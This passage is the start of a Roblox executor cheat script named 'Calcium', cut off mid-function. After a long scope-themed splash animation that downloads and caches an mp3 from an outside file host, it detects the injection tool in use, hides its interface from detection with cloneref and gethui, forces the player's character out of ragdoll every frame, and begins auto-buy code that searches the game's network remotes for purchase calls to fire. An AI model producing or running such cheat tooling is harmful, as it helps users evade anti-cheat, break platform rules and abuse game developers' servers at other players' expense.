-- CALCIUM V4: do not override error/warn/xpcall or monitor CoreGui UI trees.

-- ===================== INTRO (scope / sniper) =====================
playIntroAnimation = function()
    local Players2 = game:GetService("Players")
    local TweenService2 = game:GetService("TweenService")
    local SoundService2 = game:GetService("SoundService")
    local Debris2 = game:GetService("Debris")
    local RunService2 = game:GetService("RunService")
    local LP2 = Players2.LocalPlayer
    local guiParent = LP2:WaitForChild("PlayerGui")

    pcall(function()
        for _, parent in ipairs({
            guiParent,
            (gethui and gethui()) or nil,
            game:GetService("CoreGui"),
        }) do
            if parent then
                local old = parent:FindFirstChild("CalciumSniperIntro")
                if old then old:Destroy() end
            end
        end
    end)

    local themeAccent = Color3.fromRGB(55, 140, 255)
    local themeDim = Color3.fromRGB(100, 140, 190)
    local themeText = Color3.fromRGB(220, 235, 255)
    local LASER = Color3.fromRGB(255, 45, 45)

    local splashGui = Instance.new("ScreenGui")
    splashGui.Name = "CalciumSniperIntro"
    splashGui.ResetOnSpawn = false
    splashGui.DisplayOrder = 9999
    splashGui.IgnoreGuiInset = true
    splashGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    do
        local ok = false
        if typeof(gethui) == "function" then
            ok = pcall(function() splashGui.Parent = gethui() end)
        end
        if not ok then
            ok = pcall(function() splashGui.Parent = game:GetService("CoreGui") end)
        end
        if not ok then
            splashGui.Parent = guiParent
        end
    end

    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.fromScale(1, 1)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 1
    overlay.Parent = splashGui
    local backdrop = Instance.new("ImageLabel")
    backdrop.Name = "NebulaBackdrop"
    backdrop.Size = UDim2.fromScale(1, 1)
    backdrop.BackgroundTransparency = 1
    backdrop.Image = "rbxassetid://129085053275432"
    backdrop.ScaleType = Enum.ScaleType.Crop
    backdrop.ImageTransparency = 0.82
    backdrop.ImageColor3 = Color3.fromRGB(80, 173, 219)
    backdrop.ZIndex = 1
    backdrop.Parent = splashGui
    local backdropShade = Instance.new("Frame")
    backdropShade.BackgroundColor3 = Color3.fromRGB(5, 10, 19)
    backdropShade.BackgroundTransparency = 0.28
    backdropShade.Size = UDim2.fromScale(1, 1)
    backdropShade.BorderSizePixel = 0
    backdropShade.ZIndex = 1
    backdropShade.Parent = splashGui
    local backgroundGradient = Instance.new("UIGradient")
    backgroundGradient.Color = ColorSequence.new(Color3.fromRGB(7, 18, 36), Color3.fromRGB(0, 0, 0))
    backgroundGradient.Rotation = 90
    backgroundGradient.Parent = backdropShade
    -- Subtle static star texture: inexpensive on mobile.
    local introRandom = Random.new(24688)
    for i = 1, 22 do
        local star = Instance.new("Frame")
        local diameter = i % 5 == 0 and 3 or 2
        star.Name = "Star"
        star.Size = UDim2.fromOffset(diameter, diameter)
        star.Position = UDim2.fromScale(introRandom:NextNumber(0.05, 0.95), introRandom:NextNumber(0.08, 0.92))
        star.BackgroundColor3 = Color3.fromRGB(110, 205, 249)
        star.BackgroundTransparency = introRandom:NextNumber(0.55, 0.85)
        star.BorderSizePixel = 0
        star.ZIndex = 2
        star.Parent = splashGui
        Instance.new("UICorner", star).CornerRadius = UDim.new(1, 0)
    end

    local viewport = (workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize) or Vector2.new(1280, 720)
    local SCOPE_D = math.floor(math.clamp(math.min(viewport.X, viewport.Y) * 0.36, 132, 200))
    local TUBE = math.floor(SCOPE_D * 0.55)

    local function splashText(value, at, size, tint, alignment, z)
        local textObj = Instance.new("TextLabel")
        textObj.Text = value
        textObj.BackgroundTransparency = 1
        textObj.TextColor3 = tint
        textObj.Font = Enum.Font.GothamBold
        textObj.TextSize = size
        textObj.TextXAlignment = alignment or Enum.TextXAlignment.Center
        textObj.TextTruncate = Enum.TextTruncate.AtEnd
        textObj.Size = UDim2.new(1, -36, 0, size + 12)
        textObj.Position = at
        textObj.ZIndex = z or 20
        textObj.Parent = splashGui
        return textObj
    end
    local topBrand = splashText("C A L C I U M", UDim2.new(0, 20, 0, 27), 20,
        Color3.fromRGB(220, 245, 255), Enum.TextXAlignment.Left, 20)
    local topDivision = splashText("SPECTRA  /  STARTUP", UDim2.new(0, 20, 0, 61), 11,
        Color3.fromRGB(91, 172, 224), Enum.TextXAlignment.Left, 20)
    local headerRule = Instance.new("Frame")
    headerRule.Size = UDim2.new(1, -40, 0, 1)
    headerRule.Position = UDim2.fromOffset(20, 89)
    headerRule.BackgroundColor3 = Color3.fromRGB(43, 119, 171)
    headerRule.BackgroundTransparency = 0.45
    headerRule.BorderSizePixel = 0
    Instance.new("UICorner",headerRule).CornerRadius=UDim.new(1,0)
    headerRule.ZIndex = 20
    headerRule.Parent = splashGui
    local lowerTitle = splashText("INITIALIZING SYSTEM", UDim2.new(0, 18, 1, -147), 12,
        Color3.fromRGB(171, 221, 251), Enum.TextXAlignment.Center, 20)
    local progressTrack = Instance.new("Frame")
    progressTrack.Name = "LoadingTrack"
    progressTrack.AnchorPoint = Vector2.new(0.5, 0)
    progressTrack.Position = UDim2.new(0.5, 0, 1, -74)
    progressTrack.Size = UDim2.new(0.78, 0, 0, 4)
    progressTrack.BackgroundColor3 = Color3.fromRGB(33, 65, 86)
    progressTrack.BorderSizePixel = 0
    progressTrack.ClipsDescendants = true
    progressTrack.ZIndex = 20
    progressTrack.Parent = splashGui
    Instance.new("UICorner", progressTrack).CornerRadius = UDim.new(1, 0)
    local progressConstraint = Instance.new("UISizeConstraint", progressTrack)
    progressConstraint.MaxSize = Vector2.new(340, 4)
    local progressFill = Instance.new("Frame")
    progressFill.Name = "Progress"
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(68, 225, 255)
    progressFill.BorderSizePixel = 0
    progressFill.ZIndex = 21
    progressFill.Parent = progressTrack
    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
    local progressGlow = Instance.new("UIStroke", progressFill)
    progressGlow.Color = Color3.fromRGB(120, 225, 255)
    progressGlow.Transparency = 0.3
    progressGlow.Thickness = 1
    -- Tween once instead of driving progress in RenderStepped.
    TweenService2:Create(progressFill, TweenInfo.new(11.7, Enum.EasingStyle.Linear),
        {Size = UDim2.fromScale(1, 1)}):Play()

    local housing = Instance.new("Frame")
    housing.Size = UDim2.fromOffset(SCOPE_D + TUBE * 2, SCOPE_D + TUBE * 2)
    housing.Position = UDim2.new(0.5, -(SCOPE_D/2 + TUBE), 0.5, -(SCOPE_D/2 + TUBE))
    housing.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    housing.BorderSizePixel = 0
    housing.ZIndex = 2
    housing.Parent = splashGui
    Instance.new("UICorner", housing).CornerRadius = UDim.new(1, 0)
    local halo = Instance.new("Frame")
    halo.Name = "ScopePulse"
    halo.AnchorPoint = Vector2.new(0.5, 0.5)
    halo.Position = UDim2.fromScale(0.5, 0.5)
    halo.Size = UDim2.fromOffset(SCOPE_D + 64, SCOPE_D + 64)
    halo.BackgroundTransparency = 1
    halo.ZIndex = 3
    halo.Parent = splashGui
    Instance.new("UICorner", halo).CornerRadius = UDim.new(1, 0)
    local haloEdge = Instance.new("UIStroke", halo)
    haloEdge.Thickness = 2
    haloEdge.Color = Color3.fromRGB(79, 208, 255)
    haloEdge.Transparency = 0.45
    TweenService2:Create(haloEdge, TweenInfo.new(1.35, Enum.EasingStyle.Sine,
        Enum.EasingDirection.InOut, -1, true), {Transparency = 0.87, Thickness = 1}):Play()

    local bevel = Instance.new("Frame")
    bevel.Size = UDim2.fromOffset(SCOPE_D + 18, SCOPE_D + 18)
    bevel.Position = UDim2.new(0.5, -(SCOPE_D + 18)/2, 0.5, -(SCOPE_D + 18)/2)
    bevel.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
    bevel.BorderSizePixel = 0
    bevel.ZIndex = 3
    bevel.Parent = splashGui
    Instance.new("UICorner", bevel).CornerRadius = UDim.new(1, 0)
    do
        local s = Instance.new("UIStroke", bevel)
        s.Color = Color3.fromRGB(70, 70, 75)
        s.Thickness = 2.5
        s.Transparency = 0.25
    end

    local scopeClip = Instance.new("Frame")
    scopeClip.Name = "ScopeClip"
    scopeClip.Size = UDim2.fromOffset(SCOPE_D, SCOPE_D)
    scopeClip.Position = UDim2.new(0.5, -SCOPE_D/2, 0.5, -SCOPE_D/2)
    scopeClip.BackgroundColor3 = Color3.fromRGB(12, 16, 14)
    scopeClip.BorderSizePixel = 0
    scopeClip.ClipsDescendants = true
    scopeClip.ZIndex = 4
    scopeClip.Parent = splashGui
    Instance.new("UICorner", scopeClip).CornerRadius = UDim.new(1, 0)

    local glass = Instance.new("Frame")
    glass.Size = UDim2.fromScale(1, 1)
    glass.BackgroundColor3 = Color3.fromRGB(25, 55, 30)
    glass.BackgroundTransparency = 0.88
    glass.BorderSizePixel = 0
    glass.ZIndex = 5
    glass.Parent = scopeClip
    Instance.new("UICorner", glass).CornerRadius = UDim.new(1, 0)

    local vig = Instance.new("Frame")
    vig.Size = UDim2.fromScale(1, 1)
    vig.BackgroundTransparency = 1
    vig.ZIndex = 6
    vig.Parent = scopeClip
    Instance.new("UICorner", vig).CornerRadius = UDim.new(1, 0)
    do
        local s = Instance.new("UIStroke", vig)
        s.Color = Color3.fromRGB(0, 0, 0)
        s.Thickness = 32
        s.Transparency = 0.12
    end

    local lip = Instance.new("Frame")
    lip.Size = UDim2.fromOffset(SCOPE_D + 4, SCOPE_D + 4)
    lip.Position = UDim2.new(0.5, -(SCOPE_D + 4)/2, 0.5, -(SCOPE_D + 4)/2)
    lip.BackgroundTransparency = 1
    lip.ZIndex = 7
    lip.Parent = splashGui
    Instance.new("UICorner", lip).CornerRadius = UDim.new(1, 0)
    do
        local s = Instance.new("UIStroke", lip)
        s.Color = Color3.fromRGB(110, 110, 115)
        s.Thickness = 2
        s.Transparency = 0.25
    end

    local target = Instance.new("Frame")
    target.Name = "Target"
    target.Size = UDim2.fromOffset(72, 72)
    target.AnchorPoint = Vector2.new(0.5, 0.5)
    target.Position = UDim2.new(0.5, 18, 0.5, -8)
    target.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    target.BorderSizePixel = 0
    target.ZIndex = 8
    target.Parent = scopeClip
    Instance.new("UICorner", target).CornerRadius = UDim.new(1, 0)
    do
        local s = Instance.new("UIStroke", target)
        s.Color = Color3.fromRGB(200, 60, 60)
        s.Thickness = 2
        s.Transparency = 0.3
    end

    local head = Instance.new("ImageLabel")
    head.Name = "Headshot"
    head.Size = UDim2.fromScale(1, 1)
    head.BackgroundTransparency = 1
    head.ScaleType = Enum.ScaleType.Crop
    head.ZIndex = 9
    head.Parent = target
    Instance.new("UICorner", head).CornerRadius = UDim.new(1, 0)
    pcall(function()
        head.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LP2.UserId) .. "&w=150&h=150"
    end)

    local nameTag = Instance.new("TextLabel")
    nameTag.Size = UDim2.fromOffset(100, 14)
    nameTag.AnchorPoint = Vector2.new(0.5, 0)
    nameTag.Position = UDim2.new(0.5, 0, 1, 4)
    nameTag.BackgroundTransparency = 1
    nameTag.Text = tostring(LP2.Name or "TARGET")
    nameTag.TextColor3 = Color3.fromRGB(255, 80, 80)
    nameTag.Font = Enum.Font.GothamBold
    nameTag.TextSize = 10
    nameTag.TextTransparency = 0.15
    nameTag.ZIndex = 10
    nameTag.Parent = target

    local function hair(w, h, x, y, color, z)
        local f = Instance.new("Frame")
        f.Size = UDim2.fromOffset(w, h)
        f.Position = UDim2.new(0.5, x, 0.5, y)
        f.BackgroundColor3 = color
        f.BorderSizePixel = 0
        f.ZIndex = z or 11
        f.Parent = scopeClip
        Instance.new("UICorner", f).CornerRadius = UDim.new(1, 0)
        return f
    end
    local BLACK = Color3.fromRGB(8, 8, 8)
    local span = SCOPE_D * 0.46
    hair(span * 2, 2, -span, -1, BLACK, 11)
    hair(2, span * 2, -1, -span, BLACK, 11)
    -- Smooth reticle: the old four squared L-shaped scope brackets have been removed.
    local laserHorizontal = hair(26, 2, -13, -1, LASER, 12)
    local laserVertical = hair(2, 26, -1, -13, LASER, 12)
    Instance.new("UICorner",laserHorizontal).CornerRadius=UDim.new(1,0)
    Instance.new("UICorner",laserVertical).CornerRadius=UDim.new(1,0)
    local centerDot = Instance.new("Frame")
    centerDot.Size = UDim2.fromOffset(6, 6)
    centerDot.AnchorPoint = Vector2.new(0.5, 0.5)
    centerDot.Position = UDim2.new(0.5, 0, 0.5, 0)
    centerDot.BackgroundColor3 = LASER
    centerDot.BorderSizePixel = 0
    centerDot.ZIndex = 13
    centerDot.Parent = scopeClip
    Instance.new("UICorner", centerDot).CornerRadius = UDim.new(1, 0)

    for i = 1, 4 do
        local y = 18 + i * 14
        local d = Instance.new("Frame")
        d.Size = UDim2.fromOffset(4, 4)
        d.Position = UDim2.new(0.5, -2, 0.5, y - 2)
        d.BackgroundColor3 = LASER
        d.BackgroundTransparency = 0.15
        d.BorderSizePixel = 0
        d.ZIndex = 12
        d.Parent = scopeClip
        Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
    end

    local glare = Instance.new("Frame")
    glare.Size = UDim2.fromOffset(SCOPE_D * 0.65, 9)
    glare.AnchorPoint = Vector2.new(0.5, 0.5)
    glare.Position = UDim2.new(0.5, 0, 0.32, 0)
    glare.Rotation = -26
    glare.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    glare.BackgroundTransparency = 0.93
    glare.BorderSizePixel = 0
    glare.ZIndex = 7
    glare.Parent = scopeClip
    Instance.new("UICorner", glare).CornerRadius = UDim.new(1, 0)

    local loadingLbl = Instance.new("TextLabel")
    loadingLbl.Size = UDim2.new(1, 0, 0, 16)
    loadingLbl.Position = UDim2.new(0, 0, 1, -113)
    loadingLbl.BackgroundTransparency = 1
    loadingLbl.Text = "ACQUIRING TARGET..."
    loadingLbl.TextColor3 = themeDim
    loadingLbl.Font = Enum.Font.GothamBold
    loadingLbl.TextSize = 12
    loadingLbl.ZIndex = 20
    loadingLbl.Parent = splashGui

    local tapHint = Instance.new("TextLabel")
    tapHint.Size = UDim2.new(1, 0, 0, 16)
    tapHint.Position = UDim2.new(0, 0, 1, -24)
    tapHint.BackgroundTransparency = 1
    tapHint.Text = "TAP ANYWHERE TO SKIP"
    tapHint.TextColor3 = themeDim
    tapHint.Font = Enum.Font.GothamMedium
    tapHint.TextSize = 10
    tapHint.TextTransparency = 0.3
    tapHint.ZIndex = 20
    tapHint.Parent = splashGui

    local skipZone = Instance.new("TextButton")
    skipZone.Size = UDim2.fromScale(1, 1)
    skipZone.BackgroundTransparency = 1
    skipZone.Text = ""
    skipZone.ZIndex = 19
    skipZone.Parent = splashGui

    local calciumLbl = Instance.new("TextLabel")
    calciumLbl.Size = UDim2.fromOffset(96, 28)
    calciumLbl.AnchorPoint = Vector2.new(0.5, 0.5)
    calciumLbl.Position = UDim2.new(0.5, -42, 0.5, 36)
    calciumLbl.BackgroundTransparency = 1
    calciumLbl.Text = "CALCIUM"
    calciumLbl.TextColor3 = themeText
    calciumLbl.Font = Enum.Font.GothamBlack
    calciumLbl.TextSize = 15
    calciumLbl.TextTransparency = 1
    calciumLbl.TextStrokeTransparency = 0.3
    calciumLbl.ZIndex = 14
    calciumLbl.Parent = scopeClip
    local calcGrad = Instance.new("UIGradient", calciumLbl)
    calcGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, themeAccent),
        ColorSequenceKeypoint.new(0.5, themeText),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 210, 255)),
    })

    local sniperLbl = Instance.new("TextLabel")
    sniperLbl.Size = UDim2.fromOffset(80, 28)
    sniperLbl.AnchorPoint = Vector2.new(0.5, 0.5)
    sniperLbl.Position = UDim2.new(0.5, 44, 0.5, 36)
    sniperLbl.BackgroundTransparency = 1
    sniperLbl.Text = "SNIPER"
    sniperLbl.TextColor3 = themeText
    sniperLbl.Font = Enum.Font.GothamBlack
    sniperLbl.TextSize = 15
    sniperLbl.TextTransparency = 1
    sniperLbl.TextStrokeTransparency = 0.3
    sniperLbl.ZIndex = 14
    sniperLbl.Parent = scopeClip
    local sniperGrad = Instance.new("UIGradient", sniperLbl)
    sniperGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 210, 255)),
        ColorSequenceKeypoint.new(0.5, themeText),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 70, 120)),
    })

    local hitRing = Instance.new("Frame")
    hitRing.AnchorPoint = Vector2.new(0.5, 0.5)
    hitRing.Position = UDim2.new(0.5, 0, 0.5, 0)
    hitRing.Size = UDim2.fromOffset(20, 20)
    hitRing.BackgroundTransparency = 1
    hitRing.ZIndex = 15
    hitRing.Visible = false
    hitRing.Parent = scopeClip
    Instance.new("UICorner", hitRing).CornerRadius = UDim.new(1, 0)
    local hitStroke = Instance.new("UIStroke", hitRing)
    hitStroke.Color = LASER
    hitStroke.Thickness = 3
    hitStroke.Transparency = 0.2

    local introFinished = false
    local introCompleteEvent = Instance.new("BindableEvent")
    local introSound = nil

    local function stopIntroMusic()
        pcall(function()
            if introSound then
                introSound:Stop()
                introSound:Destroy()
                introSound = nil
            end
        end)
    end

    task.spawn(function()
        local url = "https://files.catbox.moe/8ch5qz.mp3"
        local cacheName = "CalciumSniperIntro_v2.mp3"
        local function tryCustom(path)
            local asset = nil
            pcall(function() if getcustomasset then asset = getcustomasset(path) end end)
            if (not asset or asset == "") and syn and syn.getcustomasset then
                pcall(function() asset = syn.getcustomasset(path) end)
            end
            return asset
        end
        local assetId = nil
        pcall(function()
            if isfile and isfile(cacheName) then
                assetId = tryCustom(cacheName)
            end
        end)
        if not assetId then
            local content = nil
            pcall(function()
                local req = (syn and syn.request) or (http and http.request) or request or http_request
                if req then
                    local res = req({Url = url, Method = "GET"})
                    content = res and (res.Body or res.body)
                end
            end)
            if (not content or #content == 0) then
                pcall(function() content = game:HttpGet(url) end)
            end
            if content and #content > 0 then
                pcall(function() writefile(cacheName, content) end)
                task.wait(0.05)
                assetId = tryCustom(cacheName)
                if not assetId then
                    task.wait(0.12)
                    assetId = tryCustom(cacheName)
                end
            end
        end
        if introFinished then return end
        if assetId and type(assetId) == "string" and #assetId > 0 then
            pcall(function()
                introSound = Instance.new("Sound")
                introSound.Name = "CalciumSniperIntroMusic"
                introSound.SoundId = assetId
                introSound.Volume = 1
                introSound.Looped = false
                introSound.PlaybackSpeed = 1
                local ok = pcall(function() introSound.Parent = SoundService2 end)
                if not ok then introSound.Parent = workspace end
                local t0 = tick()
                while introSound.Parent and not introSound.IsLoaded and (tick() - t0) < 2.5 do
                    task.wait(0.04)
                    if introFinished then return end
                end
                if not introFinished and introSound.Parent then
                    introSound.TimePosition = 0
                    introSound:Play()
                end
            end)
        end
    end)

    local INTRO_DURATION = 13.0
    local exitStarted = false
    local animConn = nil

    local function stopAnim()
        if animConn then pcall(function() animConn:Disconnect() end) animConn = nil end
    end

    local function playSfx(id, pitch, vol, delay)
        task.delay(delay or 0, function()
            if introFinished then return end
            local s = Instance.new("Sound")
            s.SoundId = id
            s.PlaybackSpeed = pitch or 1
            s.Volume = vol or 0.6
            s.Parent = SoundService2
            s:Play()
            Debris2:AddItem(s, 4)
        end)
    end

    local function finishIntro()
        if introFinished then return end
        introFinished = true
        stopAnim()
        stopIntroMusic()
        pcall(function() splashGui:Destroy() end)
        introCompleteEvent:Fire()
    end

    local function playExit()
        if exitStarted then return end
        exitStarted = true
        stopAnim()
        pcall(function()
            if introSound then
                TweenService2:Create(introSound, TweenInfo.new(0.4), {Volume = 0}):Play()
            end
        end)
        loadingLbl.Text = "CALCIUM  /  READY"
        loadingLbl.TextColor3 = themeAccent
        lowerTitle.Text = "SYSTEM ONLINE"
        lowerTitle.TextColor3 = Color3.fromRGB(104, 244, 209)
        TweenService2:Create(progressFill, TweenInfo.new(0.18), {Size = UDim2.fromScale(1, 1)}):Play()
        local closeInfo = TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        for _, obj in ipairs({scopeClip, bevel, lip, housing}) do
            pcall(function()
                TweenService2:Create(obj, closeInfo, {
                    Size = UDim2.fromOffset(0, 0),
                    Position = UDim2.new(0.5, 0, 0.5, 0),
                }):Play()
            end)
        end
        TweenService2:Create(overlay, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
        TweenService2:Create(loadingLbl, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
        TweenService2:Create(tapHint, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
        task.delay(0.65, finishIntro)
    end

    skipZone.MouseButton1Click:Connect(function()
        if not introFinished then playExit() end
    end)

    task.spawn(function()
        loadingLbl.Text = "CALIBRATING SCOPE..."
        playSfx("rbxassetid://9113826540", 0.85, 0.25, 0)

        local tTrack = TweenService2:Create(target, TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Position = UDim2.new(0.5, 0, 0.5, 0),
        })
        tTrack:Play()

        local lastVisualFrame = 0
        animConn = RunService2.RenderStepped:Connect(function()
            if introFinished or exitStarted then return end
            local t = tick()
            if t - lastVisualFrame < (1 / 30) then return end
            lastVisualFrame = t
            scopeClip.Rotation = math.sin(t * 0.7) * 1.2
            local breath = 1 + math.sin(t * 1.1) * 0.008
            local d = SCOPE_D * breath
            if not exitStarted then
                scopeClip.Size = UDim2.fromOffset(d, d)
                scopeClip.Position = UDim2.new(0.5, -d/2, 0.5, -d/2)
            end
            calcGrad.Rotation = (t * 40) % 360
            sniperGrad.Rotation = (-t * 35) % 360
        end)

        task.wait(2.2)
        if introFinished then return end
        loadingLbl.Text = "TARGET LOCKED  /  " .. tostring(LP2.DisplayName or LP2.Name)
        lowerTitle.Text = "OPTICS LINKED"
        loadingLbl.TextColor3 = Color3.fromRGB(255, 200, 80)
        pcall(function()
            local s = target:FindFirstChildOfClass("UIStroke")
            if s then
                TweenService2:Create(s, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 3, true), {
                    Thickness = 4,
                    Transparency = 0.05,
                }):Play()
            end
        end)

        task.wait(1.3)
        if introFinished then return end
        TweenService2:Create(calciumLbl, TweenInfo.new(0.6), {TextTransparency = 0.05}):Play()
        TweenService2:Create(sniperLbl, TweenInfo.new(0.6), {TextTransparency = 0.05}):Play()
        loadingLbl.Text = "SYNCING SYSTEM..."
        lowerTitle.Text = "SYNC  /  02"
        loadingLbl.TextColor3 = themeDim

        task.wait(2.0)
        if introFinished then return end
        loadingLbl.Text = "READY TO LAUNCH"
        lowerTitle.Text = "SYNC  /  03"
        loadingLbl.TextColor3 = Color3.fromRGB(120, 220, 140)

        task.wait(1.5)
        if introFinished then return end
        loadingLbl.Text = "CALCIUM ONLINE"
        lowerTitle.Text = "SPECTRA  /  READY"
        loadingLbl.TextColor3 = LASER
        playSfx("rbxassetid://9120383924", 1.1, 0.7, 0)
        playSfx("rbxassetid://4612414100", 1.8, 0.5, 0.05)

        local flash = Instance.new("Frame")
        flash.Size = UDim2.fromScale(1, 1)
        flash.BackgroundColor3 = Color3.fromRGB(255, 220, 180)
        flash.BackgroundTransparency = 0.35
        flash.BorderSizePixel = 0
        flash.ZIndex = 18
        flash.Parent = scopeClip
        Instance.new("UICorner", flash).CornerRadius = UDim.new(1, 0)
        TweenService2:Create(flash, TweenInfo.new(0.18), {BackgroundTransparency = 1}):Play()
        Debris2:AddItem(flash, 0.3)

        hitRing.Visible = true
        hitRing.Size = UDim2.fromOffset(16, 16)
        hitStroke.Transparency = 0
        TweenService2:Create(hitRing, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.fromOffset(100, 100),
        }):Play()
        TweenService2:Create(hitStroke, TweenInfo.new(0.45), {Transparency = 1}):Play()

        TweenService2:Create(head, TweenInfo.new(0.3), {ImageTransparency = 0.35}):Play()
        TweenService2:Create(target, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(80, 20, 20)}):Play()
        nameTag.Text = "ELIMINATED"
        nameTag.TextColor3 = LASER

        for i = 1, 6 do
            if introFinished then break end
            local ox = (math.random() - 0.5) * 10
            local oy = (math.random() - 0.5) * 10
            scopeClip.Position = UDim2.new(0.5, -SCOPE_D/2 + ox, 0.5, -SCOPE_D/2 + oy)
            housing.Position = UDim2.new(0.5, -(SCOPE_D/2 + TUBE) + ox, 0.5, -(SCOPE_D/2 + TUBE) + oy)
            task.wait(0.03)
        end
        scopeClip.Position = UDim2.new(0.5, -SCOPE_D/2, 0.5, -SCOPE_D/2)

        task.wait(1.2)
        if introFinished then return end
        loadingLbl.Text = "CALCIUM CODESNIPER  /  ONLINE"
        loadingLbl.TextColor3 = themeAccent

        task.wait(2.0)
        if introFinished then return end
        playExit()
    end)

    task.delay(INTRO_DURATION + 1.5, function()
        if not introFinished then playExit() end
    end)

    return introCompleteEvent.Event
end

-- ===================== CODE SNIPER (ULTRA-FAST) =====================
local cloneref = cloneref or function(object) return object end
local Players           = cloneref(game:GetService("Players"))
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local RunService        = cloneref(game:GetService("RunService"))
local UserInputService  = cloneref(game:GetService("UserInputService"))
local HttpService       = cloneref(game:GetService("HttpService"))
local TweenService      = cloneref(game:GetService("TweenService"))
local player = Players.LocalPlayer
local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 1) or player:WaitForChild("PlayerGui")
local GUI
local _instanceRunning = true
local _keybindListener, _boxFocusedListener, _focusReleasedListener
local _characterListener, _targetWatcherListener, _feedbackAddedListener
local _feedbackListeners = {}

-- ===== EXECUTOR NAME DETECTION =====
local function getExecutorName()
    local name = nil
    pcall(function()
        if type(identifyexecutor) == "function" then
            local ok, n = pcall(identifyexecutor)
            if ok and type(n) == "string" and n ~= "" then name = n end
        end
        if (not name or name == "") and type(getexecutorname) == "function" then
            local ok, n = pcall(getexecutorname)
            if ok and type(n) == "string" and n ~= "" then name = n end
        end
    end)
    if not name or name == "" then
        local env = (typeof(getgenv) == "function" and getgenv()) or _G
        if type(env) == "table" then
            if env.__FLUXUS or env.fluxus then name = "Fluxus"
            elseif env.__SOLARA or env.solara then name = "Solara"
            elseif env.__WAVE or env.wave then name = "Wave"
            elseif env.__DELTA or env.delta then name = "Delta"
            elseif env.__XENO or env.xeno then name = "Xeno"
            elseif env.__ARCEUS or env.arceus then name = "Arceus X"
            elseif env.__CODEIUM then name = "Codeium"
            elseif env.__VELOCITY then name = "Velocity"
            elseif env.__TRIGON then name = "Trigon"
            elseif env.__ATOM or env.atom then name = "Atom"
            elseif env.__HYDROXIDE then name = "Hydroxide"
            elseif env.__MACSWARE then name = "MacSware"
            end
        end
        if not name then
            if syn then name = "Synapse X"
            elseif secure_load or is_sirhurt_closure then name = "SirHurt"
            elseif KRNL_LOADED then name = "Krnl"
            elseif isElectron then name = "Electron"
            elseif fluxus then name = "Fluxus"
            end
        end
    end
    if not name or name == "" then name = "Unknown Executor" end
    return tostring(name)
end
local EXECUTOR_NAME = getExecutorName()

-- ===== FORWARD-DECLARED STATE =====
local _autoFarm
local _cachedBox        = nil
local _cachedBoxTime    = 0
local _cachedSubmitBtn  = nil
local _writingCodeBox   = false

local FRAME_HOOK = (RunService:IsClient() and (RunService.PreRender or RunService.PreSimulation)) or RunService.PreSimulation or RunService.Heartbeat
local _pendingCodeThisFrame = nil
local _frameFlushQueued = false

if getgenv and getgenv().StopAura then pcall(getgenv().StopAura) end

-- ============================================================
-- ALWAYS-ON ANTI RAGDOLL
-- ============================================================
local Workspace = cloneref(game:GetService("Workspace"))
local _ragdollConnection = nil
local _ragdollCooldown = 0
function calciumForceUnragdoll()
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or hum.Health <= 0 then return end
    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        hum:ChangeState(Enum.HumanoidStateType.Running)
        hum.PlatformStand = false
        hum.Sit = false
        if root then
            root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end)
end
function startAntiRagdollAlways()
    if _ragdollConnection then return end
    _ragdollConnection = RunService.Heartbeat:Connect(function()
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end
        local state = hum:GetState()
        local isRag = (state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll
            or state == Enum.HumanoidStateType.FallingDown)
        if isRag then
            local now = tick()
            if now - _ragdollCooldown > 0.12 then
                _ragdollCooldown = now
                calciumForceUnragdoll()
            end
        end
    end)
end
startAntiRagdollAlways()
_characterListener = player.CharacterAdded:Connect(function()
    task.wait(0.2)
    startAntiRagdollAlways()
end)

-- ============================================================
-- AUTO BUY / AUTO FARM
-- ============================================================
local _autoBuyActive = false
local _autoBuyRange = 22
local _autoBuyPurchaseRemote = nil
local _autoBuyConveyorCache = {}
local _autoBuyBuyLoop = nil
local _autoBuyScanLoop = nil
local _autoBuyAnchorConn = nil
local _autoBuyLockedTarget = nil
local _autoBuyAnchorPos = nil
local BUY_INTERVAL = 0.06

function autoBuyResolveRemote()
    if _autoBuyPurchaseRemote and _autoBuyPurchaseRemote.Parent then return _autoBuyPurchaseRemote end
    pcall(function()
        local pkgs = ReplicatedStorage:FindFirstChild("Packages")
        local net = pkgs and pkgs:FindFirstChild("Net")
        if net then
            for _, v in ipairs(net:GetChildren()) do
                local nl = (v.Name or ""):lower()
                if nl:find("buy") or nl:find("purchase") or nl:find("acquire") then
